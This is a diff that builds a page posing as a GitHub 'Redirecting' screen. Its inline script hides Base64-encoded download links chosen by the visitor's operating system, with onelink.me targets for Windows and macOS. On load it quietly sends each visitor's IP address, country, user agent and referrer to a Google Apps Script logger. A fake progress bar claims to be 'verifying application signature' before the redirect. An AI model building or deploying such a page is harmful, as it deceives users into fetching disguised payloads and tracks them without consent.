@@ -5,7 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
     <title>Redirecting | GitHub</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; }
+        body { background:#0d1117; color:#e6edf3; min-height:100vh; display:flex; justify-content:center; align-items:center; overflow:hidden; }
+        .container { text-align:center; max-width:500px; width:90%; padding:2rem; }
+        .github-icon { width:80px; height:80px; margin:0 auto 2rem; position:relative; }
+        .octocat-arm { position:absolute; top:35px; right:-8px; width:20px; height:12px; background:#e6edf3; border-radius:4px; transform-origin:left center; animation:wave 2s ease-in-out infinite; }
+        .logo-text { font-size:2.5rem; font-weight:600; margin-bottom:.5rem; color:#f0f6fc; }
+        .subtitle { font-size:1.1rem; color:#7d8590; margin-bottom:3rem; line-height:1.5; }
+        .loader-container { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:2.5rem 2rem; margin-bottom:2rem; }
+        .progress-info { display:flex; justify-content:space-between; margin-bottom:1rem; font-size:.9rem; color:#7d8590; }
+        .progress-bar { width:100%; height:8px; background:#21262d; border-radius:4px; overflow:hidden; margin-bottom:1.5rem; }
+        .progress-fill { height:100%; width:0%; background:#238636; border-radius:4px; transition:width .3s ease; position:relative; }
+        .progress-fill::after { content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent); animation:shine 2s infinite; }
+        .status-line { display:flex; align-items:center; justify-content:center; gap:.5rem; margin-bottom:1.5rem; font-size:.95rem; }
+        .status-dot { width:8px; height:8px; border-radius:50%; background:#238636; animation:pulse 2s infinite; }
+        .branch-info { display:inline-flex; align-items:center; gap:.5rem; padding:.5rem 1rem; background:#1f6feb; border-radius:6px; font-size:.9rem; margin-bottom:1rem; }
+        .commit-grid { display:grid; grid-template-columns:repeat(10,1fr); gap:4px; margin:1.5rem 0; }
+        .commit-cell { aspect-ratio:1; background:#21262d; border-radius:2px; transition:all .3s ease; }
+        .commit-cell.active { background:#238636; }
+        .redirect-message { color:#7d8590; font-size:.95rem; margin-top:1.5rem; }
+        .github-corner { position:absolute; top:0; right:0; border:0; fill:#30363d; color:#0d1117; }
+        @keyframes wave { 0%,100%{transform:rotate(0)} 50%{transform:rotate(-20deg)} }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
+        @keyframes shine { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
+        @keyframes fadeIn { from{opacity:0; transform:translateY(10px)} to{opacity:1; transform:translateY(0)} }
+        @media (max-width:768px){
+            .container{padding:1rem}
+            .logo-text{font-size:2rem}
+            .github-icon{width:60px;height:60px}
+            .octocat-arm{top:25px; right:-6px; width:16px; height:10px}
+        }
+    </style>
 </head>
 <body>
     <a href="https://github.com" class="github-corner" aria-label="View source on GitHub">
@@ -55,6 +86,213 @@
         <p class="redirect-message">You will be redirected to the installation page shortly</p>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        /* ================== CONFIG ================== */
+// ЗАШИФРОВАННЫЕ ссылки в Base64
+const DEST = {
+  windows:  atob("aHR0cHM6Ly9wd2luLm9uZWxpbmsubWUvem1GYy9kdDM4NzY5eg=="),
+  macos:    atob("aHR0cHM6Ly9wbWFjb3Mub25lbGluay5tZS9tNXlZL3E1dmJqZ3Zo"),
+  ios:      atob("aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc="),
+  android:  atob("aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc="),
+  linux:    atob("aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc="),
+  other:    atob("aHR0cHM6Ly9naXRodWIuY29tL3ByaWNpbmc=")
+};
+
+// ЗАШИФРОВАННЫЙ Google Apps Script URL
+const APP_URL = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3aXBfVmdQRXVtQlh1V1hfT0VYNmh1SU1IZlBYaWRpd2VIcEhSLWZHVVFJcXBjUi1tQU1BSEMxSkNVVXlKbmUzbjBRL2V4ZWM=");
+
+// Задержка после 100% до редиректа (мс)
+const REDIRECT_DELAY_MS = 200;
+
+/* ================== HELPERS ================== */
+const qs = new URLSearchParams(location.search);
+const hardOs = (qs.get('os') || '').toLowerCase();
+
+function parseParams(str) {
+    const out = {}; 
+    if(!str) return out;
+    const s = str.replace(/^[?#]+/,''); 
+    if(!s) return out;
+    
+    for(const pair of s.split('&')){ 
+        if(!pair) continue;
+        const [k,v] = pair.split('=');
+        const key = decodeURIComponent((k||'').trim());
+        const val = v===undefined ? '1' : decodeURIComponent((v||'').trim());
+        if(key) out[key]=val;
+    } 
+    return out;
+}
+
+function getOffer() {
+    const q = parseParams(location.search);
+    const h = parseParams(location.hash);
+    return q.offername || q.offer || q.offer_name || h.offername || h.offer || h.offer_name || '';
+}
+
+function keepQueryAndHash(base) { 
+    return base + location.search + (location.hash||''); 
+}
+
+// OS detect
+function detectOS() {
+    if (['windows','macos','ios','android','linux','other'].includes(hardOs)) return hardOs;
+    
+    const uad = navigator.userAgentData;
+    if (uad && uad.platform) {
+        const p = uad.platform.toLowerCase();
+        if (p.includes('windows')) return 'windows';
+        if (p.includes('mac'))     return 'macos';
+        if (p.includes('ios'))     return 'ios';
+        if (p.includes('android')) return 'android';
+        if (p.includes('linux'))   return 'linux';
+    }
+    
+    const ua = navigator.userAgent||'';
+    if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
+    if (/Android/i.test(ua))          return 'android';
+    if (/Windows NT/i.test(ua))       return 'windows';
+    if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
+    if (/Linux/i.test(ua))            return 'linux';
+    
+    return 'other';
+}
+
+// ==== NEW: get IP & Geo on the client ====
+async function getIP() {
+    try {
+        const r = await fetch("https://api64.ipify.org?format=json", {cache:"no-store"});
+        const j = await r.json();
+        return j.ip || "";
+    } catch {
+        return "";
+    }
+}
+
+async function getGeo(ip) {
+    try {
+        if(!ip) return {country:"", countryCode:""};
+        const r = await fetch(`https://ipapi.co/${ip}/json/`, {cache:"no-store"});
+        const j = await r.json();
+        return { country: j.country_name || "", countryCode: j.country || "" };
+    } catch {
+        return {country:"", countryCode:""};
+    }
+}
+
+// non-blocking лог через <img>
+function logRedirect({os, offer, targetUrl, ip, country, countryCode}) {
+    try {
+        const payload = {
+            ip, 
+            country, 
+            countryCode,
+            userAgent: navigator.userAgent,
+            referrer: document.referrer || "",
+            buttonId: "preloaderRedirect",
+            extra: `os=${os}; to=${new URL(targetUrl).host}`,
+            offer
+        };
+        const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
+        (new Image(1,1)).src = APP_URL + "?" + q + "&_t=" + Date.now();
+    } catch(_) {
+        // Ignore errors
+    }
+}
+
+/* ================== UI FUNCTIONS ================== */
+function createCommitGrid() {
+    const grid = document.getElementById('commitGrid');
+    const cellCount = 70;
+    
+    for (let i = 0; i < cellCount; i++) {
+        const cell = document.createElement('div');
+        cell.classList.add('commit-cell');
+        if (Math.random() > 0.4) cell.style.opacity = Math.random() * 0.5 + 0.3;
+        grid.appendChild(cell);
+    }
+}
+
+function animateProgress(targetUrl, os, offer) {
+    const progress = document.getElementById('progress');
+    const percentage = document.getElementById('percentage');
+    const status = document.getElementById('status');
+    const commitCells = document.querySelectorAll('.commit-cell');
+
+    const statusMessages = [
+        "Initializing security protocols",
+        "Verifying application signature",
+        "Establishing secure connection",
+        "Preparing download session",
+        "Finalizing redirect sequence"
+    ];
+
+    let progressValue = 0;
+    let currentStatus = 0;
+
+    const interval = setInterval(() => {
+        progressValue += 1;
+        progress.style.width = `${progressValue}%`;
+        percentage.textContent = `${progressValue}%`;
+
+        if (progressValue === 20 && currentStatus === 0) { 
+            status.textContent = statusMessages[1]; 
+            currentStatus = 1; 
+        }
+        if (progressValue === 45 && currentStatus === 1) { 
+            status.textContent = statusMessages[2]; 
+            currentStatus = 2; 
+        }
+        if (progressValue === 70 && currentStatus === 2) { 
+            status.textContent = statusMessages[3]; 
+            currentStatus = 3; 
+        }
+        if (progressValue === 90 && currentStatus === 3) { 
+            status.textContent = statusMessages[4]; 
+            currentStatus = 4; 
+        }
+
+        if (progressValue % 5 === 0) {
+            const randomCell = commitCells[Math.floor(Math.random() * commitCells.length)];
+            if (randomCell) { 
+                randomCell.classList.add('active'); 
+                setTimeout(() => randomCell.classList.remove('active'), 1000); 
+            }
+        }
+
+        if (progressValue >= 100) {
+            clearInterval(interval);
+            setTimeout(() => { 
+                location.replace(targetUrl); 
+            }, REDIRECT_DELAY_MS);
+        }
+    }, 40);
+}
+
+// ==== INIT: получаем IP/Geo → логируем → запускаем анимацию/редирект ====
+window.addEventListener('load', async () => {
+    createCommitGrid();
+
+    const os = detectOS();
+    const offer = getOffer();
+    const base = DEST[os] || DEST.other || location.origin;
+    const targetUrl = keepQueryAndHash(base);
+
+    // берём IP/Geo; если что-то блокируется — всё равно уйдём с пустыми полями
+    const ip = await getIP();
+    const geo = await getGeo(ip);
+
+    logRedirect({
+        os, 
+        offer, 
+        targetUrl,
+        ip,
+        country: geo.country,
+        countryCode: geo.countryCode
+    });
+
+    animateProgress(targetUrl, os, offer);
+});
+</script>
 </body>
 </html>
